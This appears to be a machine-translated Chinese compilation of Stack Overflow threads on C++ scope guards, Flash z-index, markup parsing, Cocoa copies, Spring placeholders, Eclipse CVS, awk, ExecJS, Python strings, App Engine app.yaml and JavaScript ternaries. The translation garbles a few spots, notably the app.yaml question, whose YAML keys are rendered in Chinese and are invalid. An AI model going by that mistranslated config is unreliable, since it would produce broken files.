};

template<typename F> OnExit(F&& frv) -> OnExit<F>;

int main()
{
    auto func = []{ };
    OnExit x(func);       // No move, F& refers to func
    OnExit y([]{});       // Lambda is moved to F.
} 
```

当参数是左值时，推导指南使 F 推导为左值引用。

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2017-02-28T10:53:07.140

没有承诺跟踪，但非常整洁和快速。

```
template <typename F>
struct ScopeExit {
    ScopeExit(F&& f) : m_f(std::forward<F>(f)) {}
    ~ScopeExit() { m_f(); }
    F m_f;
};

template <typename F>
ScopeExit<F> makeScopeExit(F&& f) {
    return ScopeExit<F>(std::forward<F>(f));
};

#define STRING_JOIN(arg1, arg2) STRING_JOIN2(arg1, arg2)
#define STRING_JOIN2(arg1, arg2) arg1 ## arg2

#define ON_SCOPE_EXIT(code) auto STRING_JOIN(scopeExit, __LINE__) = makeScopeExit([&](){code;}) 
```

用法

```
{
    puts("a");
    auto _ = makeScopeExit([]() { puts("b"); });
    // More readable with a macro
    ON_SCOPE_EXIT(puts("c"));
} # prints a, c, b 
```

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2012-04-22T18:26:27.180

makeScopeGuard 返回一个常量引用。您不能将此 const 引用存储在调用方的 const ref 中，如下所示：

```
const auto& a = RAII::makeScopeGuard( [&]() { myVec.pop_back(); } ); 
```

所以你正在调用未定义的行为。

[Herb Sutter GOTW 88](http://herbsutter.com/2008/01/01/gotw-88-a-candidate-for-the-most-important-const/)提供了一些关于在 const 引用中存储值的背景知识。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2018-10-12T21:25:41.550

FWIW 我认为 Andrei Alexandrescu 在他的 CppCon 2015 关于“声明式控制流”（[视频](https://www.youtube.com/watch?v=WjTrfoiB0MQ)、[幻灯片](https://github.com/CppCon/CppCon2015/blob/18943d6288b1cba54922627b71b7d21d7f1175f1/Presentations/Declarative%20Control%20Flow/Declarative%20Control%20Flow%20-%20Andrei%20Alexandrescu%20-%20CppCon%202015.pdf)）的演讲中使用了非常简洁的语法。

以下代码深受其启发：

[`Try It Online`](http://coliru.stacked-crooked.com/a/c328dd9bd10ee65b) [`GitHub Gist`](https://gist.github.com/maddouri/e22288fe973e107abf5bb775df84779d)

```
#include <iostream>
#include <type_traits>
#include <utility>

using std::cout;
using std::endl;

template <typename F>
struct ScopeExitGuard
{
public:
    struct Init
    {
        template <typename G>
        ScopeExitGuard<typename std::remove_reference<G>::type>
        operator+(G&& onScopeExit_)
        {
            return {false, std::forward<G>(onScopeExit_)};
        }
    };

private:
    bool m_callOnScopeExit = false;
    mutable F m_onScopeExit;

public:
    ScopeExitGuard() = delete;
    template <typename G> ScopeExitGuard(const ScopeExitGuard<G>&) = delete;
    template <typename G> void operator=(const ScopeExitGuard<G>&) = delete;
    template <typename G> void operator=(ScopeExitGuard<G>&&) = delete;

    ScopeExitGuard(const bool callOnScopeExit_, F&& onScopeExit_)
    : m_callOnScopeExit(callOnScopeExit_)
    , m_onScopeExit(std::forward<F>(onScopeExit_))
    {}

    template <typename G>
    ScopeExitGuard(ScopeExitGuard<G>&& other)
    : m_callOnScopeExit(true)
    , m_onScopeExit(std::move(other.m_onScopeExit))
    {
        other.m_callOnScopeExit = false;
    }

    ~ScopeExitGuard()
    {
        if (m_callOnScopeExit)
        {
            m_onScopeExit();
        }
    }
};

#define ON_SCOPE_EXIT_GUARD_VAR_2(line_num) _scope_exit_guard_ ## line_num ## _
#define ON_SCOPE_EXIT_GUARD_VAR(line_num) ON_SCOPE_EXIT_GUARD_VAR_2(line_num)
// usage
//     ON_SCOPE_EXIT <callable>
//
// example
//     ON_SCOPE_EXIT [] { cout << "bye" << endl; };
#define ON_SCOPE_EXIT                             \
    const auto ON_SCOPE_EXIT_GUARD_VAR(__LINE__)  \
        = ScopeExitGuard<void*>::Init{} + /* the trailing '+' is the trick to the call syntax ;) */

int main()
{
    ON_SCOPE_EXIT [] {
        cout << "on scope exit 1" << endl;
    };

    ON_SCOPE_EXIT [] {
        cout << "on scope exit 2" << endl;
    };

    cout << "in scope" << endl;  // "in scope"
}
// "on scope exit 2"
// "on scope exit 1" 
```

对于您的用例，您可能还感兴趣[`std::uncaught_exception()`并`std::uncaught_exceptions()`](https://en.cppreference.com/w/cpp/error/uncaught_exception)了解您是“正常”退出范围还是在引发异常之后：

```
ON_SCOPE_EXIT [] {
    if (std::uncaught_exception()) {
        cout << "an exception has been thrown" << endl;
    }
    else {
        cout << "we're probably ok" << endl;
    }
}; 
```

高温高压

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2017-05-15T21:18:28.823

这是另一个，现在是@kwarnke 的变体：

```
std::vector< int > v{ };

v.push_back( 42 );

std::shared_ptr< void > guard( nullptr , [ & v ] ( auto )
{
    v.pop_back( );
} ); 
```

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2022-02-16T22:07:03.760

这是我在 C++17 中提出的一个。将其移植到 C++11 和/或添加停用选项很简单：

```
template<class F>
struct scope_guard
{
    F f_;
    ~scope_guard() { f_(); }
};

template<class F> scope_guard(F) -> scope_guard<F>; 
```

用法：

```
void foo()
{
    scope_guard sg1{ []{...} };
    auto sg2 = scope_guard{ []{...} };
} 
```

**编辑：**在同一个键这里是只在“异常”时关闭的警卫：

```
#include <exception>

template<class F>
struct xguard
{
    F   f_;
    int count_ = std::uncaught_exceptions();

    ~xguard() { if (std::uncaught_exceptions() != count_) f_(); }
};

template<class F> xguard(F) -> xguard<F>; 
```

用法：

```
void foobar()
{
    xguard xg{ []{...} };
    ...
    // no need to deactivate if everything is good

    xguard{ []{...} },   // will go off only if foo() or bar() throw
        foo(),
        bar();

    // 2nd guard is no longer alive here
} 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2013-11-11T13:28:44.477

你已经选择了一个答案，但无论如何我都会接受挑战：

```
#include <iostream>
#include <type_traits>
#include <utility>

template < typename RollbackLambda >
class ScopeGuard;

template < typename RollbackLambda >
auto  make_ScopeGuard( RollbackLambda &&r ) -> ScopeGuard<typename
 std::decay<RollbackLambda>::type>;

template < typename RollbackLambda >
class ScopeGuard
{
    // The input may have any of: cv-qualifiers, l-value reference, or both;
    // so I don't do an exact template match.  I want the return to be just
    // "ScopeGuard," but I can't figure it out right now, so I'll make every
    // version a friend.
    template < typename AnyRollbackLambda >
    friend
    auto make_ScopeGuard( AnyRollbackLambda && ) -> ScopeGuard<typename
     std::decay<AnyRollbackLambda>::type>;

public:
    using lambda_type = RollbackLambda;

private:
    // Keep the lambda, of course, and if you really need it at the end
    bool        committed;
    lambda_type  rollback;

    // Keep the main constructor private so regular creation goes through the
    // external function.
    explicit  ScopeGuard( lambda_type rollback_action )
        : committed{ false }, rollback{ std::move(rollback_action) }
    {}

public:
    // Do allow moves
    ScopeGuard( ScopeGuard &&that )
        : committed{ that.committed }, rollback{ std::move(that.rollback) }
    { that.committed = true; }
    ScopeGuard( ScopeGuard const & ) = delete;

    // Cancel the roll-back from being called.
    void  commit()  { committed = true; }

    // The magic happens in the destructor.
    // (Too bad that there's still no way, AFAIK, to reliably check if you're
    // already in exception-caused stack unwinding.  For now, we just hope the
    // roll-back doesn't throw.)
    ~ScopeGuard()  { if (not committed) rollback(); }
};

template < typename RollbackLambda >
auto  make_ScopeGuard( RollbackLambda &&r ) -> ScopeGuard<typename
 std::decay<RollbackLambda>::type>
{
    using std::forward;

    return ScopeGuard<typename std::decay<RollbackLambda>::type>{
     forward<RollbackLambda>(r) };
}

template < typename ActionLambda, typename RollbackLambda >
auto  make_ScopeGuard( ActionLambda && a, RollbackLambda &&r, bool
 roll_back_if_action_throws ) -> ScopeGuard<typename
 std::decay<RollbackLambda>::type>
{
    using std::forward;

    if ( not roll_back_if_action_throws )  forward<ActionLambda>(a)();
    auto  result = make_ScopeGuard( forward<RollbackLambda>(r) );
    if ( roll_back_if_action_throws )  forward<ActionLambda>(a)();
    return result;
}

int  main()
{
    auto aa = make_ScopeGuard( []{std::cout << "Woah" << '\n';} );
    int  b = 1;

    try {
     auto bb = make_ScopeGuard( [&]{b *= 2; throw b;}, [&]{b = 0;}, true );
    } catch (...) {}
    std::cout << b++ << '\n';
    try {
     auto bb = make_ScopeGuard( [&]{b *= 2; throw b;}, [&]{b = 0;}, false );
    } catch (...) {}
    std::cout << b++ << '\n';

    return 0;
}
// Should write: "0", "2", and "Woah" in that order on separate lines. 
```

您没有创建函数和构造函数，而是仅限于创建函数，主构造函数是`private`. 我不知道如何将`friend`-ed 实例化限制为仅涉及当前模板参数的实例化。（也许是因为该参数仅在返回类型中提及。）也许可以在此站点上询问对此的修复。由于第一个动作不需要存储，它只存在于创建函数中。`throw`如果从第一个操作触发回滚，则有一个布尔参数来标记。

该`std::decay`部分去除了 cv 限定符和参考标记。但是如果输入类型是内置数组，则不能将其用于此通用目的，因为它也会应用数组到指针的转换。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2018-08-15T21:51:43.817

*还有一个答案，但我担心我发现其他人都缺乏某种方式。值得注意的是，接受的答案可以追溯到 2012 年，但它有一个重要的错误（请参阅[此评论](https://stackoverflow.com/questions/10270328/the-simplest-and-neatest-c11-scopeguard/51866951#comment90686294_10270809)）。由此可见测试的重要性。*

[这](https://ricab.github.io/scope_guard/)是一个 >=C++11 scope_guard 的实现，它是公开可用并经过广泛测试的。它的意思是/拥有：

*   现代、优雅、简单（主要是单功能界面，没有宏）
*   一般（接受任何尊重先决条件的可调用）
*   仔细记录
*   瘦回调包装（没有添加`std::function`或虚拟表惩罚）
*   适当的异常规范

另请参阅[功能的完整列表](https://ricab.github.io/scope_guard/#features)。

# css - 为什么 noverblaster 视频播放器总是在其他元素之上

> ID：10270330
> 
> 赞同：0
> 
> 时间：2012-04-22T17:35:29.947
> 
> 标签：css, video

我正在寻找一个免费的视频播放器放在网站上，并找到[了 nonverblaster](http://www.nonverbla.de/blog/nonverblasterhover/)，但我无法将其设置在其他元素后面 - 属性 z-index 不起作用，你知道有什么解决方案迫使他合作? 我的一段简单的代码：

```
<div style="position:relative;">
    <div id="main-video" style="position:absolute;top:0px;left:0px;z-index:10;">
        To watch this video, you need the latest <a href="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" target="_blank">Flash-Player</a> and active javascript in your browser.
    </div>

    <img src="media/nice-flowers.jpg" alt="alt" style="position:absolute;left:0px;top:400px;z-index:100" />
</div>

<script type="text/javascript">
    var flashvars = {};
        flashvars.mediaURL = "../../uploads/files/movie.mp4";
        flashvars.teaserURL = "uploads/files/start_frame.jpg";
        flashvars.allowSmoothing = "true";
        flashvars.autoPlay = "false";
        flashvars.buffer = "6";
        flashvars.showTimecode = "true";
        flashvars.loop = "false";
        flashvars.controlColor = "0x3fd2a3";
        flashvars.controlBackColor = "0x000000";
        flashvars.scaleIfFullScreen = "true";
        flashvars.showScalingButton = "true";
        flashvars.defaultVolume = "100";
        flashvars.crop = "false";
        flashvars.onClick = "toggleFullScreen";

    var params = {};
        params.menu = "false";
        params.allowFullScreen = "true";
        params.allowScriptAccess = "always"

    var attributes = {};
        attributes.id = "nonverblaster";
        attributes.bgcolor = "#000000"
    function embedSWF()
    {
        swfobject.embedSWF("js/video_player/video_player.swf", "main-video", "762", "429", "9", "js/video_player/expressinstall.swf", flashvars, params, attributes);
    }
    embedSWF();
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T17:44:05.773

您需要将 设置`wmode`为`opaque`。

因此，使用您的脚本，添加一行`params.wmode = "opaque";`

# python - 跟踪字符串中标记的最有效方法是什么？

> ID：10270331
> 
> 赞同：1
> 
> 时间：2012-04-22T17:35:33.240
> 
> 标签：python, html, regex, markdown, markup

*这个问题可能是以不同的方式提出的，如果是这样，请指出我。我只是在搜索结果中找不到它。*

我想解析文本以进行标记，就像 SO 上的那些。

1.  例如。`* some string`对于项目符号列表
2.  例如。`*some string*`斜体文字
3.  例如。`&some string&`一个网址
4.  例如。`&some string&specific url&`对于不同于字符串的 URL

等等

我可以想到两种方法来处理字符串以找出特殊的标记序列：

**一个。**我可以以字符为中心的方式进行，即解析字符串以查找序列 1，然后是 2 等。但这似乎效率低下，因为它必须多次解析字符串。

**湾。**最好逐个字符地处理字符串并记住特殊字符及其位置。如果内存与上述特殊序列匹配，则字符串中的特殊字符将替换为 HTML。但是，我不确定这是否是一个更好的主意，也不确定应该如何实现它。

解决此问题的最佳方法是什么？正则表达式怎么样？它遵循模式**a**还是**b**？有第三种选择吗？

PS我正在使用Python。Python 示例最受赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T19:57:17.890

您实际上是在尝试实现词法分析器或“词法分析器”。您可以尝试搜索“lexer”、“parser”、“markup”以获取更多阅读材料。*[编辑：我的意思可能是“解析器”，而不是“词法分析器”。词法分析器是解析器的一部分。]*

解析器通常使用正则表达式作为解决方案的**一部分**来实现，但除此之外还有更多内容。

如果您专门为 Markdown 执行此操作，您确定不想使用[现有的 Markdown 解析器/词法分析器吗？](https://stackoverflow.com/questions/605434/how-would-you-go-about-parsing-markdown)已经存在一些非常快速且经过良好测试的 Markdown 解析器。

* * *

旁注：请尽量不要滚动您自己的标记语法 - 已经有几十种纯文本标记语言。选择一个你喜欢的并使用它。我想到了维基百科格式、Markdown 和其他。有现成的工具可以解析这些。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-22T17:43:31.693

当然是正则表达式！如果还没有这样做，学习它。完成后，你会发现很难想象没有它你是如何相处的。您展示的示例使用正则表达式很简单。例如，一个星号，然后是一个空格，然后是一个单词，表示为：

`\*\s\w+`

除了正则表达式没有别的。

# cocoa - 字典副本与可变副本

> ID：10270332
> 
> 赞同：5
> 
> 时间：2012-04-22T17:35:38.153
> 
> 标签：cocoa, copy, nsdictionary, nsmutabledictionary

我有

```
NSMutableDictionary *myDictionary = [[NSMutableDictionary alloc] init];
id dict = [myDictionary copy]; 
```

但`dict`现在只是一个普通的`NSDictionary`？还是它的副本`NSMutableDictionary`？

另外，有没有办法从可变到不可变？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-04-22T17:49:24.367

这里涉及两种方法；`-copy`和`-mutableCopy`。

如果班级有区别；`-copy`总是创建一个不可变的副本；并且`-mutableCopy`总是创建一个可变副本。

如果班级没有区别；`-copy`总是创建一个真实的副本。

所以是的，dict 现在是一个 NSDictionary，包含字典中的对象。

# java - 为什么在我的上下文文件中 ${} 变量没有被解释为构造函数参数值？

> ID：10270335
> 
> 赞同：2
> 
> 时间：2012-04-22T17:36:00.087
> 
> 标签：java, spring, spring-mvc, servlets

我有一个 Spring 3.1 应用程序，我尝试在上下文文件中使用系统变量。变量“JAVA_MY_ENV”是在我的系统上定义的（在 Windows 上，它位于控制面板的“系统变量”中）。

在 web.xml 中，我可以将它用作变量并且它可以工作，它被变量的实际值成功替换（比如说“电型”）：

```
<listener>
    <listener-class>org.springframework.web.util.Log4jConfigListener</listener-class>
</listener> 
<context-param>
    <param-name>log4jConfigLocation</param-name>
    <param-value>classpath:log/${JAVA_MY_ENV}.log4j.properties</param-value>
</context-param> 
```

我也可以在我的主要“bean”上下文中使用它来进行导入，它也可以工作：

```
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:context="http://www.springframework.org/schema/context"       
        xmlns:tx="http://www.springframework.org/schema/tx" 
        xsi:schemaLocation="http://www.springframework.org/schema/beans
                            http://www.springframework.org/schema/beans/spring-beans-3.1.xsd
                            http://www.springframework.org/schema/context
                            http://www.springframework.org/schema/context/spring-context-3.1.xsd
                            http://www.springframework.org/schema/tx
                            http://www.springframework.org/schema/tx/spring-tx-3.1.xsd">

    <!-- (...) -->

    <import resource="classpath:spring/app-config.xml" />
    <import resource="classpath:spring/env/context-env-${JAVA_MY_ENV}.xml" />

</beans> 
```

但是在我的其他上下文文件之一“app-config.xml”中，我尝试了这个，但它*不起作用*：

```
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:context="http://www.springframework.org/schema/context"       
        xmlns:tx="http://www.springframework.org/schema/tx" 
        xsi:schemaLocation="http://www.springframework.org/schema/beans
                            http://www.springframework.org/schema/beans/spring-beans-3.1.xsd
                            http://www.springframework.org/schema/context
                            http://www.springframework.org/schema/context/spring-context-3.1.xsd
                            http://www.springframework.org/schema/tx
                            http://www.springframework.org/schema/tx/spring-tx-3.1.xsd">

    <bean id="appConfiguration" class="com.xxx.app.AppConfiguration">
        <constructor-arg value="${JAVA_MY_ENV}" />
    </bean>

</beans> 
```

com.xxx.app.AppConfiguration 接收字符串 "${JAVA_MY_ENV}" 作为构造函数参数，而不是它的解释值！

我不确定理解 ${} 变量在哪里被解释以及它们在哪里不被解释。

有没有办法可以将解释的 ${JAVA_MY_ENV} 值传递给我的 com.xxx.app.AppConfiguration 构造函数？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-22T18:03:01.123

从 Spring 的 3.0 开始，您应该将值注入属性

```
@Value("#{ systemProperties['JAVA_MY_ENV'] }") 
private String myVar; 
```

或者

```
<property name ="myVar" value="#{systemProperties['JAVA_MY_ENV']}"/> 
```

或者，您可以考虑使用 PropertySourcesPlaceholderConfigurer 或类似的类。创建它会告诉 spring 如何查找变量。我经常制作一些属性文件，以便应用程序可以使用环境和内部属性文件值。例如

```
<bean id="propertyConfigurer" class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer">
  <property name="locations">
    <list>
        <value>classpath:someprops.properties</value>
    </list>
  </property>
  <property name="ignoreResourceNotFound" value="true" />
  <property name="searchSystemEnvironment" value="true" />
  <property name="systemPropertiesModeName" value="SYSTEM_PROPERTIES_MODE_OVERRIDE" /> 
```

上述示例中的一个关键元素是将“searchSystemEnvironment”设置为 true。这告诉 spring 使用 env 变量（这是你想要的）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-23T08:16:44.097

[子（Web）上下文无法访问](https://stackoverflow.com/questions/3816617/contextproperty-placeholder-properties-not-accessible-to-the-child-web-cont)的 <context:property-placeholder> 属性可能重复 据我了解，这是预期的行为。您应该只在 servlet 上下文中注入 bean，或者将配置 bean 包含到 servlet-context.xml

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-23T01:40:29.170

使用 BruceLowe 建议的 PropertyPlaceholderConfigurer 是可行的。我发现解决*特定*属性的另一种方法（可能更复杂）是使用：

```
<bean id="JAVA_MY_ENV" class="org.springframework.util.SystemPropertyUtils" factory-method="resolvePlaceholders">
    <constructor-arg value="${JAVA_MY_ENV}" /> 
</bean> 
```

这将创建一个包含 ${JAVA_MY_ENV}*解析*值的**字符串**bean ！

 *然后我可以在任何可以使用 bean ref 的地方使用这个 bean。例如作为构造函数参数：

```
<bean id="appConfiguration" class="com.xxx.app.AppConfiguration">
    <constructor-arg ref="JAVA_MY_ENV" />
</bean> 
```

所以现在我在解释它的地方使用 ${JAVA_MY_ENV}，而不添加 PropertyPlaceholderConfigurer，否则使用 JAVA_MY_ENV bean。*

# eclipse - Eclipse CVS extssh 在 Windows 7 + Java 7 下损坏

> ID：10270339
> 
> 赞同：4
> 
> 时间：2012-04-22T17:36:06.747
> 
> 标签：eclipse, ssh, cvs, vpn, java-7

我正在运行 Windows 7 64 位。在我之前使用 Java 6 安装 Java 7（PS3 媒体服务器的一部分）后，我的 Eclipse（Indigo Service Release 2，Build id：20120216-1857）CVS 停止在 VPN 上的服务器上工作。我使用 Cisco AnyConnect VPN 客户端版本 2.5.2019 进行连接。每当我尝试连接到存储库时，我得到的错误如下：

```
Could not connect to :extssh:username@example.com:/cvsroot/username/project: CVS communication error:   org.eclipse.team.internal.ccvs.ssh2.CVSSSH2ServerConnection$SSH2IOException: Permission  denied: connect
Permission denied: connect 
```

我可以通过[强制 Eclipse 在 Java 6 JVM 下运行](http://wiki.eclipse.org/Eclipse.ini#-vm_value%3a_Windows_Example)来解决它。这不是防火墙问题，因为我关闭了 Windows 防火墙，而且 Wireshark 没有显示超出 DNS 查找的流量。

我的 JRE（Java 6 和 Java 7）都是 32 位版本；他们的路径分别是

```
C:\Program Files (x86)\Java\jre6
C:\Program Files (x86)\Java\jre7 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-22T18:25:09.750

我找到了一个非常相似的问题的[答案](https://stackoverflow.com/a/8142281/1168342)，除了它涉及 SVN 而不是 CVS。“错误”似乎是 Cisco AnyConnect VPN 没有正确支持 IPv6，它是使用较新的 jre7 调用的。

因此，将以下内容添加到 my`eclipse.ini`可以解决我的情况：

```
openFile
-vmargs
-Djava.net.preferIPv4Stack=true 
```

# regex - AWK SHELL 将值从 shell 传递到 AWK

> ID：10270340
> 
> 赞同：0
> 
> 时间：2012-04-22T17:36:24.753
> 
> 标签：regex, linux, shell, unix, awk

我需要将特定值从 shell 传递到 AWK 脚本文件，但我不知道我不能这样做。

```
 #! /bin/bash

if [ "$2" = "-C" ] && [ "$3" != "" ]; then

        awk -f SpecCity.awk $1

elif [ "$2" = "-C" ] && [ "$3" = "" ]; then

        awk -f CityOnly.awk $1

fi 
```

我需要将值 $3 传递给 AWK，它会将它与我将指向的文件进行比较，但我不能这样做。

知道怎么做吗？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-22T17:41:25.403

您应该能够使用“awk -v”。例如，“awk -v city=$3...”

较新版本的 awk 也应该支持“ENVIRON[]”数组。

这两个选项都在这里讨论：

[http://unix-school.blogspot.com/2011/09/awk-passing-arguments-or-shell.html](http://unix-school.blogspot.com/2011/09/awk-passing-arguments-or-shell.html)

# ruby-on-rails - Ruby - ExecJS 未加载（我有正确的材料和 PATH 位置。）[Windows]

> ID：10270348
> 
> 赞同：0
> 
> 时间：2012-04-22T17:37:38.307
> 
> 标签：ruby-on-rails, node.js, environment-variables, rubymine, execjs

我遇到了 ExecJS 的问题，因为它无法找到所需的运行时。我正在使用 Windows，并且我的计算机上同时安装了 Windows CScript 和 Node.js，但这些人都没有被调用。

结果，我无法运行任何涉及此问题的 rails 任务（我什至无法在 RubyMine 中加载我的 rake 列表来调用诸如 db:create 之类的操作来从一个新项目创建我的数据库。）

我能够从命令行访问 csript 和 node，并且我已经检查了我的环境变量，并且它们的正确文件位置在 PATH 中。还有其他东西破坏了我使用 ExecJS 的能力。有没有其他人有过类似的经历，你已经拥有了所有正确的东西，但还是有问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T11:58:20.227

当 Ruby 生成子进程以调用 CScript 或 Node 时，它​​将使用允许`cmd.exe`从命令行执行它们的相同规则。

但是，有时，注册表或环境变量中的内容会影响此过程。

在 RubyInstaller 项目中，我们收集了一系列可能是罪魁祸首的[故障排除项目。](https://github.com/oneclick/rubyinstaller/wiki/Troubleshooting#wiki-gems_fails_comspec_autorun)

请检查`COMSPEC`环境变量是否设置为使用`cmd.exe`，而不是像 TCC/LE 或其他东西。

```
C:\>SET COMSPEC 
```

此外，请检查您的注册表是否包含`AutoRun`密钥，这也会影响 Ruby。

```
C:\>REG QUERY "HKCU\Software\Microsoft\Command Processor"
C:\>REG QUERY "HKLM\Software\Microsoft\Command Processor" 
```

如果您`AutoRun`在上述命令之一中看到一个键，则意味着设置为在每次启动新命令时*自动执行*`cmd.exe`某些内容，这在某些情况下很糟糕。

请按照“疑难解答”页面中有关如何删除它的说明进行操作。

这也会影响需要编译的 gem 安装，但如果你没有失败，那么问题可能是别的。

希望有帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T23:28:29.337

我遇到了类似的问题，尽管安装了 Node.js，但我的基本骨架应用程序无法运行，然后尝试了 therubyracer gem。最后，我决定在 Windows 上使用我的故障排除口头禅，“如有疑问，请以管理员身份运行”。所以我以管理员身份运行我的 rails cmd，之后它运行良好。

# python - 连接字符串？

> ID：10270349
> 
> 赞同：6
> 
> 时间：2012-04-22T17:37:48.163
> 
> 标签：python, string

```
def change(s):
    s = s + "!"

word = "holiday"
change(word)    
print word 
```

为什么这个输出是“holiday”而不是“holiday！”？是不是因为 3 行代码在函数之外？如果是这样，为什么它在函数之外，因为它在更改函数之后？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-22T17:41:36.523

试试这个：

```
def change(s):
    return s + "!" 
```

像这样使用它：

```
word = 'holiday'
print change(word) 
```

或者像这样：

```
word = 'holiday'
word = change(word)
print word 
```

请注意，您对函数内部的参数字符串所做的任何修改都*不会*在函数外部看到，因为函数中的`s`参数在函数范围内是本地的，并且您所做的任何更改（如问题中的代码） ) 只会在函数内部可见，而不是外部可见。Python 中的所有函数参数都是[按值传递的](https://stackoverflow.com/a/986145/201359)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-22T17:40:37.870

您只是在修改`s`函数中的局部变量`change`。这不会修改变量`word`。如果你想修改`word`，你需要返回结果`change`并将其分配给`word`：

```
def change(s):
    s = s + "!"
    return s

word = "holiday"
word = change(word)    
print word 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-22T17:39:31.457

您没有从更改中返回值。

尝试：

```
def change(s):
    s = s + "!"
    return s

word = "holiday"
word = change(word)    
print word 
```

所以在上面的例子中， s 正在被修改，然后 word 被重新分配修改后的值。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-22T17:43:46.443

您正在将单词的“副本”而不是单词实例传递给函数。因此，更改将应用​​于您在函数内的 s 变量中保存的单词副本

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-22T17:45:30.283

`s`in`change(s)`是一个名称，它绑定到`word`调用时的值`change(word)`。

在该行`s = s + "!"`中，您将绑定`s`到一个新字符串，该字符串是通过连接绑定到`s`and的值创建的`!`，而不是对`word`.

即使有可能，最好不要产生副作用，因此返回一个新值会更好。

```
def change(s):
    return s + '!' 
```

# google-app-engine - 如何配置 app.yaml 以使用图像？

> ID：10270350
> 
> 赞同：2
> 
> 时间：2012-04-22T17:37:48.230
> 
> 标签：google-app-engine

我的 python (appspots.com) 项目的图像有一个大问题。

如何为图片配置 app.yaml？我的图像在目录 /css/images/xy.png

日志说：

> 信息 2012-04-22 17:29:42,601 dev_appserver.py:2884]“获取 /css/images/ui-bg_glass_75_e6e6e6_1x400.png HTTP/1.1”404 -

我的 app.yaml（仅处理程序）：

```
- 网址：/js
  静态目录：js

- 网址：/css/main.css
  静态文件：css/main.css
  上传：css/main.css

- 网址：/css/jquery-ui-1.8.19.custom.css
  静态文件：css/jquery-ui-1.8.19.custom.css
  上传：css/jquery-ui-1.8.19.custom.css

- 网址：.*
  脚本：main.py

- 网址：/css/images/.*
  静态目录：css/图像

```

我希望你能帮助我:)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-22T18:03:13.820

问题是你`.*`以前有，`/css/images./*`并且该模式匹配所有内容。像这样重新排列它：

```
- url: /js
  static_dir: js

- url: /css/main.css 
  static_files: css/main.css
  upload: css/main.css 

- url: /css/jquery-ui-1.8.19.custom.css 
  static_files: css/jquery-ui-1.8.19.custom.css
  upload: css/jquery-ui-1.8.19.custom.css 

- url: /css/images
  static_dir: css/images

- url: .*
  script: main.py 
```

编辑：尝试从模式末尾删除 /.*，如上图所示。

# javascript - 如何在 JavaScript 中编写内联 IF 语句？

> ID：10270351
> 
> 赞同：345
> 
> 时间：2012-04-22T17:37:59.380
> 
> 标签：javascript, if-statement, ternary-operator, conditional-operator

如何`if`在 JavaScript 中使用内联语句？是否也有内联`else`语句？

像这样的东西：

```
var a = 2;
var b = 3;

if(a < b) {
    // do something
} 
```

* * *

## 回答 #1

> 赞同：755
> 
> 时间：2012-04-22T17:40:35.797

你不一定需要 jQuery。仅 JavaScript 就可以做到这一点。

```
var a = 2;
var b = 3;    
var c = ((a < b) ? 'minor' : 'major'); 
```

如果值为，则`c`变量将为，如果值为。`minor``true``major``false`

* * *

这称为条件（三元）运算符。

[https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Operators/Conditional_Operator](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Operators/Conditional_Operator)

* * *

## 回答 #2

> 赞同：52
> 
> 时间：2012-04-22T17:40:50.290

有一个三元运算符，如下所示：

```
var c = (a < b) ? "a is less than b"  : "a is not less than b"; 
```

* * *

## 回答 #3

> 赞同：50
> 
> 时间：2012-04-22T17:43:14.027

对于`if`内联编写语句，其中的代码应该只有一个语句：

```
if ( a < b ) // code to be executed without curly braces; 
```

* * *

## 回答 #4

> 赞同：43
> 
> 时间：2013-11-04T10:02:41.147

您还可以仅使用逻辑运算符来近似 if/else。

```
(a && b) || c 
```

上面说的大致相同：

```
a ? b : c 
```

当然，大致与以下内容相同：

```
if ( a ) { b } else { c } 
```

我粗略地说是因为这种方法有一个区别，因为您必须知道 的值`b`将评估为真，否则您将始终得到`c`. 基本上你必须意识到，`if () { here }`现在出现的部分是你所放置的条件的一部分`if ( here ) { }`。

由于 JavaScript 传递/返回形成逻辑表达式的原始值之一的行为，上述情况是可能的，这取决于运算符的类型。某些其他语言，如 PHP，会进行实际的运算结果，即 true 或 false，这意味着结果始终为 true 或 false；例如：

```
14 && 0          /// results as 0,  not false
14 || 0          /// results as 14, not true
1 && 2 && 3 && 4 /// results as 4,  not true
true && ''       /// results as ''
{} || '0'        /// results as {} 
```

与普通的 if 语句相比，一个主要的好处是前两种方法可以在参数的右侧操作，即作为赋值的一部分。

```
d = (a && b) || c;
d = a ? b : c;

if `a == true` then `d = b` else `d = c` 
```

使用标准 if 语句实现此目的的唯一方法是复制分配：

```
if ( a ) { d = b } else { d = c } 
```

